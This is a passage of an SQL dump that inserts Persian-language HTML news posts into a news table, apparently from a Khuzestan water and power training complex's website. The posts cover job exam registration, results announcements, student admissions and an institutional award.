	به اطلاع می رساند نظر به درخواست های مکرر متقاضیان جدید جهت ثبت نام و شرکت در این آزمون&nbsp; مهلت ثبت نام و ویرایش تا روز شنبه مورخ 26 شهریورماه تمدید گردید.</p>
<p dir="RTL">
	لازم به ذکر است پذیرفته شدگان ۳ برابر ظرفیت رشته شغلی رانندگان پایه یکم علاوه بر شرایط ذکر شده در آگهی آزمون، دارا بودن گواهینامه کار با جرثقیل و یا بالابر، از امتیاز ویژه ای در آزمون دانش مهارت (مصاحبه) برخوردار خواهند شد.</p>
<p dir="RTL">
	&nbsp;</p>
<p dir="RTL" style="text-align: center;">
	<a href="https://estekhdam.kwphc.ir/azmoon140106" target="_blank"><strong><span style="color:#a52a2a;"><span style="font-size:18px;">لینک ثبت نام</span></span></strong></a></p>
<p style="text-align: center;">
	&nbsp;</p>
<p style="text-align: center;">
	<img alt="" src="wp-content/uploads/news-images/image_23.jpeg" /></p>
', '51190PicTamdid.jpg', 2351, '1401/6/17', '5:00:48 PM', 1401, 'شهریور', 6, '17');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (52189, 1, 'e7b6bb6e-4088-45d8-9725-d2c15ddd7cbb', 'آگهي استخدام', '<p>
	شرکت شرکت نصب و تعمیرات نیروگاه های خوزستان به منظور تأمين نيروي انساني مورد نياز خود از بین افراد واجد شرایط دعوت به همکاری می نماید.</p>
', '<p dir="RTL" style="margin-right: 0.2pt; text-align: justify;">
	به اطلاع ميرساند شرکت نصب و تعمیرات نیروگاه های خوزستان ازشرکت&shy;های طرف قرارداد شرکت سهامی برق منطقه&shy;ای خوزستان به منظور تأمين نيروي انساني مورد نياز، تعداد <strong><u>53</u></strong> نفر <strong>از آقايان </strong>واجد شرايط را از طريق آزمون توانمندي&shy;هاي عمومی و تخصصي(كتبي) و آزمون دانش مهارت (&shy;مصاحبه) و طی فرآیند گزینش و به ترتیب از بالاترین نمره با شرايط ذيل و در قالب قرارداد نیروی حجمی جذب مي&shy; نمايد.</p>
<p dir="RTL" style="text-align: justify;">
	در صورت بروز هرگونه مشكل و ابهام با شماره تلفن 33347248-061 مجتمع عالي آموزشي و پژوهشي صنعت آب و برق خوزستان به عنوان مجري آزمون در وقت اداري تماس حاصل نمایید.</p>
<p dir="RTL">
	&nbsp;</p>
<p dir="RTL" style="text-align: justify;">
	&nbsp;</p>
<p dir="RTL" style="text-align: center;">
	<a href="https://kwphc.ir/archive/other/help40108.pdf" target="_blank"><strong><span style="color:#008000;"><span style="font-family:tahoma,geneva,sans-serif;"><span style="font-size:18px;">دریافت فایل راهنما</span></span></span></strong></a></p>
<p dir="RTL" style="text-align: center;">
	&nbsp;</p>
<p dir="RTL" style="text-align: center;">
	<a href="http://estekhdam.kwphc.ir/azmoon140108/" target="_blank"><span style="color:#800080;"><strong><span style="font-family:tahoma,geneva,sans-serif;"><span style="font-size:18px;">لینک ثبت نام</span></span></strong></span></a></p>
<p dir="RTL" style="text-align: center;">
	&nbsp;</p>
<p dir="RTL" style="text-align: center;">
	<span style="color:#800080;"><strong><span style="font-family:tahoma,geneva,sans-serif;"><span style="font-size:18px;"><img alt="" src="wp-content/uploads/news-images/image_24.jpeg" /></span></span></strong></span></p>
<p>
	&nbsp;</p>
', '51191EstNrg.jpg', 7830, '1401/7/26', '1:59:37 PM', 1401, 'مهر', 7, '26');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (52190, 1, 'e7b6bb6e-4088-45d8-9725-d2c15ddd7cbb', 'اعلام نتایج آزمون', '<div style="direction:rtl;">
	<p dir="RTL">
		اعلام نتایج آزمون کتبي جذب نيروي حجمي مورخ 31 شهریور شرکت تلاشگران آروین آپادانا</p>
</div>
<p>
	&nbsp;</p>
', '<p dir="RTL">
	داوطلبین محترم آزمون کتبي جذب نيروي حجمي مورخ 31 شهریور شرکت تلاشگران آروین آپادانا می توانند جهت اطلاع از نتایج آزمون از لینک ذیل مراجعه نمایند.</p>
<p dir="RTL">
	&nbsp;</p>
<p align="center" dir="RTL">
	<a href="https://estekhdam.kwphc.ir/azmoon140106" target="_blank"><span style="font-family:tahoma,geneva,sans-serif;"><strong><span style="color:#a52a2a;"><span style="font-size:18px;">اعلام نتایج آزمون</span></span></strong></span></a></p>
<p align="center" dir="RTL">
	&nbsp;</p>
<p align="center" dir="RTL">
	<a href="https://kwphc.ir/Archive/Other/ApadanaAdv.pdf" target="_blank"><span style="font-family:tahoma,geneva,sans-serif;"><strong><span style="color:#008000;"><span style="font-size:16px;">دریافت اطلاعیه</span></span></strong></span></a></p>
<p align="center" dir="RTL">
	&nbsp;</p>
<p align="center" dir="RTL">
	<img alt="" src="wp-content/uploads/news-images/image_25.jpeg" /></p>
<p>
	&nbsp;</p>
', '52190AdvApadana.jpg', 2250, '1401/8/3', '1:45:08 PM', 1401, 'آبان', 8, '3');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (52191, 1, 'e7b6bb6e-4088-45d8-9725-d2c15ddd7cbb', 'تمدید زمان ثبت نام آزمون مورخ 26 آبان', '<p>
	قابل توجه داوطلبان آزمون جذب نیروی حجمی شرکت نصب و تعمیرات نیروگاه های خوزستان مورخ 26 آبان ماه 1401</p>
', '<p>
	به اطلاع می رساند نظر به درخواست های مکرر متقاضیان جدید جهت ثبت نام و شرکت در این آزمون مهلت ثبت نام و ویرایش تا روز شنبه مورخ 21 آبان ماه تمدید گردید.</p>
<p>
	&nbsp;</p>
<p dir="RTL" style="text-align: center;">
	<a href="https://kwphc.ir/archive/other/help40108.pdf" target="_blank"><strong><span style="color:#008000;"><span style="font-family:tahoma,geneva,sans-serif;"><span style="font-size:18px;">دریافت فایل راهنما</span></span></span></strong></a></p>
<p dir="RTL" style="text-align: center;">
	&nbsp;</p>
<p dir="RTL" style="text-align: center;">
	<a href="http://estekhdam.kwphc.ir/azmoon140108/" target="_blank"><span style="color:#800080;"><strong><span style="font-family:tahoma,geneva,sans-serif;"><span style="font-size:18px;">لینک ثبت نام</span></span></strong></span></a></p>
<p dir="RTL" style="text-align: center;">
	&nbsp;</p>
<p dir="RTL" style="text-align: center;">
	<span style="color:#800080;"><strong><span style="font-family:tahoma,geneva,sans-serif;"><span style="font-size:18px;"><img alt="" src="wp-content/uploads/news-images/image_26.jpeg" /></span></span></strong></span></p>
<p style="text-align: center;">
	&nbsp;</p>
', '52191Tmd0826.jpg', 3427, '1401/8/14', '4:15:41 PM', 1401, 'آبان', 8, '14');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (53189, 1, 'e7b6bb6e-4088-45d8-9725-d2c15ddd7cbb', 'برای اولین بار رقم خورد', '<p>
	<span dir="RTL">مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان موفق به کسب رتبه برتر آموزشی در بین موسسات دارای صلاحیت آموزش کارکنان دولت در هفته آموزش استان خوزستان در سال </span><span dir="RTL">۱۴۰۱</span> <span dir="RTL">گردید.</span></p>
', '<p dir="RTL" style="text-align: justify;">
	مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان، در نخستین بزرگداشت هفته آموزش استان که با حضور آقای مهندس موالی زاده فرماندار محترم استان خوزستان، آقای دکتر نیکو رئیس سازمان مدیریت و برنامه ریزی خوزستان و جمعی از مدیران ارشد دانشگاه ها و دستگاه های خصوصی و اجرایی استان برگزار شد، عنوان موسسه برتر آموزشی در بین موسسات دارای صلاحیت آموزش کارکنان دولت را در هفته آموزش استان خوزستان در سال ۱۴۰۱ احراز نمود و از سوی استاندار خوزستان تندیس و لوح تقدیر دریافت نمود.</p>
<p dir="RTL" style="text-align: justify;">
	گفتنی است آیین تجلیل از برگزیدگان این بزرگداشت روز چهارشنبه مورخ ۱۸ آبان ماه ۱۴۰۱ در سالن همایش کوی بوستان سازمان آب و برق خوزستان برگزار و از آقای مهندس محسن انصاری (سرپرست مجتمع) تقدیر به عمل آمد.</p>
<p dir="RTL" style="text-align: justify;">
	&nbsp;</p>
<p dir="RTL" style="text-align: center;">
	&nbsp;</p>
<table align="center" border="0" cellpadding="1" cellspacing="1" style="width: 910px">
	<tbody>
		<tr>
			<td style="text-align: center;">
				<img alt="" src="wp-content/uploads/news-images/image_27.jpeg" /></td>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				<img alt="" src="wp-content/uploads/news-images/image_28.jpeg" /></td>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				<img alt="" src="wp-content/uploads/news-images/image_29.jpeg" /></td>
		</tr>
		<tr>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				&nbsp;</td>
		</tr>
		<tr>
			<td style="text-align: center;">
				<img alt="" src="wp-content/uploads/news-images/image_30.jpeg" /></td>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				<img alt="" src="wp-content/uploads/news-images/image_31.jpeg" /></td>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				<img alt="" src="wp-content/uploads/news-images/image_32.jpeg" /></td>
		</tr>
		<tr>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				&nbsp;</td>
		</tr>
		<tr>
			<td style="text-align: center;">
				<img alt="" src="wp-content/uploads/news-images/image_33.jpeg" /></td>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center; vertical-align: top;">
				<img alt="" src="wp-content/uploads/news-images/image_34.png" /></td>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center; vertical-align: top;">
				<img alt="" src="wp-content/uploads/news-images/image_35.jpeg" /></td>
		</tr>
	</tbody>
</table>
<p dir="RTL" style="text-align: center;">
	&nbsp;</p>
<p dir="RTL" style="text-align: justify;">
	&nbsp;</p>
<p style="text-align: center;">
	<br />
	<br />
	<br />
	<br />
	&nbsp;</p>
', '52192NP.jpg', 1312, '1401/8/28', '3:05:50 PM', 1401, 'آبان', 8, '28');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (53190, 1, 'e7b6bb6e-4088-45d8-9725-d2c15ddd7cbb', 'برگزاری آزمون استخدامی', '<div style="direction:rtl;">
	<p>
		<span dir="RTL">قابل توجه داوطلبان شرکت در آزمون جذب نیروی حجمی <span dir="RTL">شرکت برجمان ارشیا، دنیا کاران جنوب و تاراز منار</span></span></p>
</div>
<p>
	&nbsp;</p>
', '<p dir="RTL" style="text-align: justify;">
	به اطلاع ميرساند شرکت<span dir="RTL"><span dir="RTL">برجمان ارشیا، دنیا کاران جنوب و تاراز منار</span></span> به منظور تأمين نيروي انساني مورد نياز، از آقايان واجد شرايط و از طريق آزمون توانمنديهاي عمومی و تخصصي(كتبي) و آزمون دانش مهارت (مصاحبه) و طی فرآیند گزینش و به ترتیب از بالاترین نمره با شرايط ذيل و در قالب قرارداد نیروی حجمی جذب می نماید.</p>
<p dir="RTL" style="text-align: justify;">
	در صورت بروز هرگونه مشكل و ابهام با شماره تلفن 33347248-061 مجتمع عالي آموزشي و پژوهشي صنعت آب و برق خوزستان به عنوان مجري آزمون در وقت اداري تماس حاصل نمایید.</p>
<p dir="RTL" style="text-align: justify;">
	&nbsp;</p>
<p dir="RTL" style="text-align: center;">
	<a href="https://kwphc.ir/Archive/Other/WECo.pdf" target="_blank"><strong><span style="color:#008000;"><span style="font-family:tahoma,geneva,sans-serif;"><span style="font-size:18px;">دریافت فایل راهنما</span></span></span></strong></a></p>
<p dir="RTL" style="text-align: center;">
	&nbsp;</p>
<p dir="RTL" style="text-align: center;">
	<a href="http://estekhdam.kwphc.ir/azmoon140109" target="_blank"><span style="color:#800080;"><strong><span style="font-family:tahoma,geneva,sans-serif;"><span style="font-size:18px;">لینک ثبت نام</span></span></strong></span></a></p>
<p dir="RTL" style="text-align: center;">
	&nbsp;</p>
<p dir="RTL" style="text-align: center;">
	&nbsp;</p>
<p dir="RTL" style="text-align: center;">
	&nbsp;</p>
<p style="text-align: center;">
	<img alt="" src="wp-content/uploads/news-images/image_36.jpeg" style="height: 850px; width: 600px;" /></p>
', '53190NGHSH.png', 5791, '1401/9/6', '11:34:40 AM', 1401, 'آذر', 9, '6');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (53191, 1, 'e7b6bb6e-4088-45d8-9725-d2c15ddd7cbb', 'برای اولین بار رقم خورد', '<p dir="RTL" style="text-align: justify;">
	این مجتمع موفق به کسب رتبه برتر آموزشی در بین موسسات دارای صلاحیت آموزش کارکنان دولت در هفته آموزش استان خوزستان در سال ۱۴۰۱ گردید.</p>
<p>
	&nbsp;</p>
', '<p dir="RTL" style="text-align: justify;">
	مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان، در نخستین بزرگداشت هفته آموزش استان که با حضور آقای مهندس موالی زاده فرماندار محترم استان خوزستان، آقای دکتر نیکو رئیس سازمان مدیریت و برنامه ریزی خوزستان و جمعی از مدیران ارشد دانشگاه ها و دستگاه های خصوصی و اجرایی استان برگزار شد، عنوان موسسه برتر آموزشی در بین موسسات دارای صلاحیت آموزش کارکنان دولت را در هفته آموزش استان خوزستان در سال ۱۴۰۱ احراز نمود و از سوی استاندار خوزستان تندیس و لوح تقدیر دریافت نمود.</p>
<p dir="RTL" style="text-align: justify;">
	گفتنی است آیین تجلیل از برگزیدگان این بزرگداشت روز چهارشنبه مورخ ۱۸ آبان ماه ۱۴۰۱ در سالن همایش کوی بوستان سازمان آب و برق خوزستان برگزار و از آقای مهندس محسن انصاری (سرپرست مجتمع) تقدیر به عمل آمد.</p>
<p dir="RTL" style="text-align: justify;">
	&nbsp;</p>
<p dir="RTL" style="text-align: center;">
	&nbsp;</p>
<table align="center" border="0" cellpadding="1" cellspacing="1" style="width: 910px">
	<tbody>
		<tr>
			<td style="text-align: center;">
				<img alt="" src="wp-content/uploads/news-images/image_37.jpeg" /></td>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				<img alt="" src="wp-content/uploads/news-images/image_38.jpeg" /></td>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				<img alt="" src="wp-content/uploads/news-images/image_39.jpeg" /></td>
		</tr>
		<tr>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				&nbsp;</td>
		</tr>
		<tr>
			<td style="text-align: center;">
				<img alt="" src="wp-content/uploads/news-images/image_40.jpeg" /></td>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				<img alt="" src="wp-content/uploads/news-images/image_41.jpeg" /></td>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				<img alt="" src="wp-content/uploads/news-images/image_42.jpeg" /></td>
		</tr>
		<tr>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center;">
				&nbsp;</td>
		</tr>
		<tr>
			<td style="text-align: center;">
				<img alt="" src="wp-content/uploads/news-images/image_43.jpeg" /></td>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center; vertical-align: top;">
				<img alt="" src="wp-content/uploads/news-images/image_44.png" /></td>
			<td style="text-align: center;">
				&nbsp;</td>
			<td style="text-align: center; vertical-align: top;">
				<img alt="" src="wp-content/uploads/news-images/image_45.jpeg" /></td>
		</tr>
	</tbody>
</table>
<p dir="RTL" style="text-align: center;">
	&nbsp;</p>
<p dir="RTL" style="text-align: justify;">
	&nbsp;</p>
<p style="text-align: center;">
	<br />
	<br />
	&nbsp;</p>
', '53191Avalinbar.jpg', 332, '1401/9/10', '8:05:59 PM', 1401, 'آذر', 9, '10');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (53192, 1, 'e7b6bb6e-4088-45d8-9725-d2c15ddd7cbb', 'اعلام نتایج آزمون', '<p>
	اعلام نتایج آزمون کتبي جذب نيروي حجمي مورخ 26 آبان ماه شرکت نصب و تعمیرات نیروگاه های خوزستان</p>
', '<p dir="RTL">
	داوطلبین محترم آزمون کتبي جذب نيروي حجمي مورخ 26 آبان ماه 1401 شرکت نصب و تعمیرات نیروگاه های خوزستان می توانند جهت اطلاع از نتایج آزمون از لینک ذیل استفاده نمایند.</p>
<p dir="RTL">
	&nbsp;</p>
<p align="center" dir="RTL">
	<a href="https://estekhdam.kwphc.ir/azmoon140108" target="_blank"><span style="font-family:tahoma,geneva,sans-serif;"><strong><span style="color:#a52a2a;"><span style="font-size:18px;">اعلام نتایج آزمون</span></span></strong></span></a></p>
<p align="center" dir="RTL">
	&nbsp;</p>
<p align="center" dir="RTL">
	<a href="https://www.kwphc.ir/Archive/Other/AdvNasb.pdf" target="_blank"><span style="font-family:tahoma,geneva,sans-serif;"><strong><span style="color:#008000;"><span style="font-size:16px;">دریافت اطلاعیه</span></span></strong></span></a></p>
<p align="center" dir="RTL">
	&nbsp;</p>
<p align="center" dir="RTL">
	<img alt="" src="wp-content/uploads/news-images/image_46.jpeg" style="height: 707px; width: 500px;" /></p>
<p align="center" dir="RTL">
	<br />
	<br />
	&nbsp;</p>
<p style="text-align: center;">
	&nbsp;</p>
', '53192NasbNews.jpg', 7036, '1401/9/20', '3:56:28 PM', 1401, 'آذر', 9, '20');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (53193, 1, 'e7b6bb6e-4088-45d8-9725-d2c15ddd7cbb', 'پذیرش دانشجو بدون کنکور', '<p>
	مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان برای بهمن ماه سال 1401 بدون کنکور دانشجو می پذیرد.</p>
', '<p style="text-align: justify;">
	مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان، بهمن ماه سال 1401 با ظرفیت 18 رشته تحصیلی در <strong>مقاطع کاردانی و کارشناسی ناپیوسته،</strong> <strong>بدون کنکور</strong> دانشجو می پذیرد.</p>
<p style="text-align: justify;">
	علاقمندان می توانند جهت کسب اطلاعات بیشتر با شماره های 06133340070 و 09378535157 تماس حاصل نموده یا به آدرس : اهواز &ndash; بلوار گلستان &ndash; بین خیابان کاشان و همدان &ndash; روبروی هتل نیشکر مراجعه نمایند.</p>
<p style="text-align: justify;">
	&nbsp;</p>
<p style="text-align: center;">
	<span style="font-size:18px;"><a href="https://register2.sanjesh.org/regjamekardani_140110/" target="_blank"><span style="color:#ff00cc;">ثبت نام دوره کاردانی</span></a></span></p>
<p style="text-align: center;">
	&nbsp;</p>
<p style="text-align: center;">
	<a href="https://register2.sanjesh.org/NOET_Register_Jamekarshenasi140110" target="_blank"><span style="color:#800080;"><span style="font-size:18px;">ثبت نام دوره کارشناسی ناپيوسته</span></span></a></p>
<p style="text-align: justify;">
	&nbsp;</p>
<p style="text-align: center;">
	<img alt="" src="wp-content/uploads/news-images/image_47.jpeg" /></p>
', '53193SbtPic.jpg', 1590, '1401/10/4', '2:06:10 AM', 1401, 'دی', 10, '4');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (53194, 1, 'e7b6bb6e-4088-45d8-9725-d2c15ddd7cbb', 'اعلام نتایج آزمون', '<p>
	اعلام نتایج آزمون کتبي جذب نيروي حجمي مورخ 25 آذرماه1401 شرکتهای برجمان ارشیا، دنیا کاران جنوب و تاراز منار</p>
', '<p dir="RTL">
	داوطلبین محترم آزمون کتبي جذب نيروي حجمي مورخ 25 آذرماه1401 شرکتهای برجمان ارشیا، دنیا کاران جنوب و تاراز منار می توانند جهت اطلاع از نتایج آزمون از لینک ذیل استفاده نمایند.</p>
<p dir="RTL">
	&nbsp;</p>
<p align="center" dir="RTL">
	<a href="https://estekhdam.kwphc.ir/azmoon140109/" target="_blank"><span style="font-family:tahoma,geneva,sans-serif;"><strong><span style="color:#a52a2a;"><span style="font-size:18px;">اعلام نتایج آزمون</span></span></strong></span></a></p>
<p align="center" dir="RTL">
	&nbsp;</p>
<p style="text-align: center;">
	<a href="https://www.kwphc.ir/Archive/Other/Az2509.pdf" target="_blank"><span style="font-family:tahoma,geneva,sans-serif;"><strong><span style="color:#008000;"><span style="font-size:16px;">دریافت اطلاعیه</span></span></strong></span></a></p>
<p style="text-align: center;">
	&nbsp;</p>
<p style="text-align: center;">
	<img alt="" src="wp-content/uploads/news-images/image_48.jpeg" /></p>
', '53194RsltPic.jpg', 2274, '1401/10/10', '2:46:39 PM', 1401, 'دی', 10, '10');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (54193, 1, 'e7b6bb6e-4088-45d8-9725-d2c15ddd7cbb', 'آزمون استخدامی', '<p>
	موسسه خدمات حفاظتی و مراقبتی حافظین امنیت پادنا به منظور تأمين نيروي انساني مورد نياز خود از بین افراد واجد شرایط دعوت به همکاری می نماید.</p>
', '<p dir="RTL" style="margin-right: 0.2pt; text-align: justify;">
	به اطلاع ميرساند موسسه خدمات حفاظتی و مراقبتی حافظین امنیت پادنا به منظور تأمين نيروي انساني مورد نياز، <strong>از آقايان </strong>واجد شرايط را از طريق آزمون توانمندي&shy;هاي عمومی و تخصصي(كتبي) و آزمون دانش مهارت (&shy;مصاحبه) و طی فرآیند گزینش و به ترتیب از بالاترین نمره با شرايط ذيل و در قالب قرارداد نیروی حجمی جذب مي&shy; نمايد.</p>
<p dir="RTL" style="text-align: justify;">
	در صورت بروز هرگونه مشكل و ابهام با شماره تلفن 33347248-061 مجتمع عالي آموزشي و پژوهشي صنعت آب و برق خوزستان به عنوان مجري آزمون در وقت اداري تماس حاصل نمایید.</p>
<p dir="RTL" style="text-align: justify;">
	&nbsp;</p>
<p dir="RTL" style="text-align: center;">
	<span style="color:#ff6600;"><strong>قابل توجه داوطبان گرامی : با عنایت به قانون حمایت از خانواده و جوانی جمعیت شرایط سنی این آگهی تغییر یافت لطفا نسبت مطالعه مجدد آن اقدام نمایید .</strong></span></p>
<p dir="RTL" style="text-align: justify;">
	&nbsp;</p>
<p dir="RTL" style="text-align: center;">
	<a href="https://kwphc.ir/Azmoon/AzmoonAdv/AdvNegahban.pdf" target="_blank"><span style="color:#4b0082;"><span style="font-size:18px;">دریافت آگهی</span></span></a></p>
<p dir="RTL" style="text-align: center;">
	<a href="https://kwphc.ir/Azmoon/AzmoonAdv/Attach1.pdf" target="_blank"><span style="font-size:18px;"><span style="color:#800080;">دریافت ضمیمه 1</span></span></a></p>
<p dir="RTL" style="text-align: center;">
	<a href="https://kwphc.ir/Azmoon/AzmoonAdv/Attach2.pdf" target="_blank"><span style="color:#ee82ee;"><span style="font-size:18px;">دریافت ضمیمه 2</span></span></a></p>
<p dir="RTL" style="text-align: center;">
	&nbsp;</p>
<p dir="RTL" style="text-align: center;">
	<a href="https://estekhdam.kwphc.ir/azmoon140111" target="_blank"><span style="color:#000080;"><span style="font-size:18px;">لینک ثبت نام</span></span></a></p>
<p dir="RTL" style="text-align: center;">
	&nbsp;</p>
<p style="text-align: center;">
	<img alt="" src="wp-content/uploads/news-images/image_49.jpeg" style="height: 708px; width: 500px;" /></p>
', '53195nwspadena.jpg', 15611, '1401/11/6', '5:53:05 PM', 1401, 'بهمن', 11, '6');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (54194, 1, 'e7b6bb6e-4088-45d8-9725-d2c15ddd7cbb', 'نخستین رویداد سنجش و ارزیابی صلاحیت حرفه ای', '<section class="News-Detail-Lead">
	<div style="text-align: justify;">
		<span style="font-size:14px;"><a href="https://www.news.kwpa.ir/%D8%A8%D8%AE%D8%B4-%D8%AF%D8%B3%D8%AA%D9%87-%D8%A8%D9%86%D8%AF%DB%8C-%D9%86%D8%B4%D8%AF%D9%87-1/7682-%D9%86%D8%AE%D8%B3%D8%AA%DB%8C%D9%86-%D8%A2%D8%B2%D9%85%D9%88%D9%86-%D8%B3%D9%86%D8%AC%D8%B4-%D8%A7%D8%B1%D8%B2%DB%8C%D8%A7%D8%A8%DB%8C-%D8%B5%D9%84%D8%A7%D8%AD%DB%8C%D8%AA-%D8%AD%D8%B1%D9%81%D9%87-%D8%A7%DB%8C-%D9%86%DB%8C%D8%B1%D9%88%DB%8C-%D8%A7%D9%86%D8%B3%D8%A7%D9%86%DB%8C-%D8%B4%D8%B1%DA%A9%D8%AA%D9%87%D8%A7%DB%8C-%D9%BE%DB%8C%D9%85%D8%A7%D9%86%DA%A9%D8%A7%D8%B1-%D8%A8%D8%AE%D8%B4-%D8%A2%D8%A8-%D9%88%D8%B2%D8%A7%D8%B1%D8%AA-%D9%86%DB%8C%D8%B1%D9%88-%D8%AF%D8%B1-%D8%B3%D8%A7%D8%B2%D9%85%D8%A7%D9%86-%D8%A2%D8%A8-%D8%A8%D8%B1%D9%82-%D8%AE%D9%88%D8%B2%D8%B3%D8%AA%D8%A7%D9%86" target="_blank" title="نخستین آزمون سنجش و ارزیابی صلاحیت حرفه ای نیروی انسانی شرکتهای پیمانکار بخش آب وزارت نیرو در سازمان آب و برق خوزستان"><span style="color:#000000;">نخستین رویداد سنجش و ارزیابی صلاحیت حرفه ای نیروی انسانی شرکت&zwnj;های پیمانکار در مشاغل</span></a><span style="color:#000000;"> اختصاصی بخش آب وزارت نیرو، توسط مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان برگزار شد.</span></span></div>
</section>
<p>
	&nbsp;</p>
', '<p style="text-align: justify;">
	<span style="font-size:14px;"><span style="color:#000000;">برای اولین&zwnj; بار، سنجش و ارزیابی صلاحیت حرفه&zwnj;ای مشاغل اختصاصی صنعت آب و برق در &quot;سطح الف&quot; مطابق با نظام صلاحیت حرفه&zwnj;ای نیروی انسانی، برای کارکنان شاغل در شرکت بهره&zwnj;برداری از سد، نیروگاه و شبکه&zwnj;های آبیاری مارون در روزهای 4 و 5 بهمن&zwnj;ماه برگزاری شد.<br />
	این رویداد ارزیابی صلاحیت حرفه&zwnj;ای مطابق با استانداردهای شایستگی مشاغل شرکت مادرتخصصی مدیریت منابع آب ایران، در 14 رشته شغلی از حوزه&zwnj;های بهره&zwnj;برداری و نگهداری از سد، نیروگاه و شبکه&zwnj;های آبیاری و زهکشی توسط مجتمع آموزشی و پژوهشی خوزستان در بهبهان برگزار شد. شاغلان این آزمون از سوی ارزیابان تخصصي معرفی&zwnj;شده شرکت مادرتخصصي منابع آب ايران مورد سنجش و ارزیابی دانشی قرار گرفتند.<br />
	لازم به ذکر است، تحقق اهداف مهم صنعت آب و برق شامل تأمین برق مطمئن و پايا، آب سالم و كافي و خدمات بهداشتي فاضلاب، نيازمند هماهنگي منابع سه&zwnj;گانه &laquo;مالي، سخت&zwnj;افزاري و نيروي انساني&raquo; است و نقش منابع انساني شاغل در این صنعت زیربنائی، حیاتی است. به&zwnj;طور خاص، كاركنان شاغل در مشاغل اختصاصي شركت&zwnj;هاي پيمانكاري صنعت آب و برق در راستاي تكاليف و مأموریت&zwnj;های وزارت نيرو نقش کلیدی دارند تا ضمن بهره&zwnj;برداري بهينه از تأسیسات و تجهيزات صنعت آب و برق، فرايندهاي نگهداري و تعميرات را به نحو مطلوب جهت حداكثر بهره&zwnj;وري و افزايش طول عمر مفيد آن به انجام رسانند. مسئوليت توسعه نظامات و سازوكارهاي لازم براي كسب اطمينان از صلاحيت فني و تخصصي و حرفه&zwnj;اي سرمايه&zwnj;هاي انساني صنعت و ارتقاء دانش و مهارت&zwnj;هاي شغلي ايشان و همچنين كاهش حوادث و سوانح شغلي، بر عهده وزارت نیرو به عنوان متولی تامین آب و برق، می&zwnj;باشد. از جمله اقدامات معاونت تحقيقات و منابع انساني وزارت نيرو، پياده&zwnj;سازي نظام صلاحيت حرفه&zwnj;اي منابع انساني شاغل در شركت&zwnj;هاي پيمانكار بوده كه مرحله اجرايي آن در سطح شركت&zwnj;هاي تابعه از سال 1401 آغاز شده است؛ مطابق مصوبات هفتادمين كميته توانمندسازي صنعت آب و برق، استقرار &quot;سطح الف&quot; طرح فوق شامل ارزیابی صلاحیت دانشی تا انتهاي سال جاري در دستور کار دارد. افرادي که در سطح الف نظام صلاحیت حرفه&zwnj;ای نیروی انسانی پذيرفته شوند، در مراحل بعد مي&zwnj;توانند در ارزیابي دانشي تکميلي و مهارتي براي دريافت گواهينامه &quot;سطح ب&quot; نظام صلاحیت حرفه&zwnj;ای نیروی انسانی شرکت نمایند. با توجه به برنامه&zwnj;ريزي انجام&zwnj;شده توسط وزارت نيرو جهت پياده&zwnj;سازي مطلوب سطوح بعدي اين نظام در سال 1402، مزايا و امتياز شغلي متناسب آن طراحي، تدوين و ابلاغ خواهد شد.</span></span></p>
<p style="text-align: justify;">
	&nbsp;</p>
<table align="center" border="0" cellpadding="0" cellspacing="0" style="width: 910px">
	<tbody>
		<tr>
			<td>
				<img alt="" src="wp-content/uploads/news-images/image_50.jpeg" /></td>
			<td style="width: 5px;">
				&nbsp;</td>
